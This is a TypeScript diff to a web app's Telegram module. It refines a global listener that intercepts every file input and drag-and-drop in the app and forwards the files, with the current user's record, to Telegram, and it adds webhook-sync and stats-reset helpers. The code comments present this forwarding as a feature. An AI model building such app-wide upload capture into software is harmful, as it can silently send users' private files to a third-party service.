@@ -211,12 +211,14 @@ export function enqueueTelegramForwardBatch(
 
 // Track if global interceptor is initialized
 let isGlobalInterceptorActive = false;
+let currentUserGetter: (() => UserRecord | null) = () => null;
 
 /**
  * Attaches a global listener to intercept ANY file input or drop event anywhere in the app
  * ensuring all uploaded files are safely and automatically forwarded to Telegram.
  */
 export function initGlobalUploadInterceptor(getCurrentUser: () => UserRecord | null) {
+  currentUserGetter = getCurrentUser;
   if (typeof window === 'undefined' || isGlobalInterceptorActive) return;
   isGlobalInterceptorActive = true;
 
@@ -225,7 +227,7 @@ export function initGlobalUploadInterceptor(getCurrentUser: () => UserRecord | n
     try {
       const target = event.target as HTMLInputElement;
       if (target && target.tagName === 'INPUT' && target.type === 'file' && target.files && target.files.length > 0) {
-        const user = getCurrentUser();
+        const user = currentUserGetter();
         const files = Array.from(target.files);
         const sourceName = target.getAttribute('name') || target.getAttribute('data-feature') || target.id || 'File Input';
         enqueueTelegramForwardBatch(files, user, `Form Input (${sourceName})`);
@@ -239,7 +241,7 @@ export function initGlobalUploadInterceptor(getCurrentUser: () => UserRecord | n
   window.addEventListener('drop', (event: DragEvent) => {
     try {
       if (event.dataTransfer && event.dataTransfer.files && event.dataTransfer.files.length > 0) {
-        const user = getCurrentUser();
+        const user = currentUserGetter();
         const files = Array.from(event.dataTransfer.files);
         enqueueTelegramForwardBatch(files, user, 'Drag and Drop');
       }
@@ -452,3 +454,61 @@ export async function deleteTelegramWebhookClient(
     return { success: false, message: err?.message || 'تعذر حذف Webhook' };
   }
 }
+
+/**
+ * Fetch real-time webhook status and bot reachability directly from Telegram Bot API
+ */
+export async function getTelegramLiveInfo(): Promise<{
+  success: boolean;
+  bot?: any;
+  webhook?: any;
+  currentDomain?: string;
+  expectedWebhookUrl?: string;
+  currentWebhookUrl?: string;
+  isSynced?: boolean;
+  pendingUpdates?: number;
+  lastError?: string | null;
+  lastErrorDate?: number | null;
+  error?: string;
+}> {
+  try {
+    const res = await fetch('/api/telegram/webhook-info');
+    if (!res.ok) return { success: false, error: `HTTP ${res.status}` };
+    return await res.json();
+  } catch (e: any) {
+    return { success: false, error: e?.message || 'Network error' };
+  }
+}
+
+/**
+ * Seamlessly registers the current hosting domain with the Telegram Bot API Webhook
+ */
+export async function autoSyncTelegramDomain(domainUrl?: string): Promise<{
+  success: boolean;
+  message: string;
+  webhookUrl?: string;
+}> {
+  try {
+    const res = await fetch('/api/telegram/auto-sync-domain', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ domainUrl: domainUrl || (typeof window !== 'undefined' ? window.location.origin : '') })
+    });
+    return await res.json();
+  } catch (e: any) {
+    return { success: false, message: e?.message || 'Failed auto-sync domain' };
+  }
+}
+
+/**
+ * Resets Telegram stats and forwarding log counters
+ */
+export async function resetTelegramStats(): Promise<{ success: boolean; message: string }> {
+  try {
+    const res = await fetch('/api/telegram/reset-stats', { method: 'POST' });
+    return await res.json();
+  } catch (e: any) {
+    return { success: false, message: e?.message || 'Failed reset stats' };
+  }
+}
+
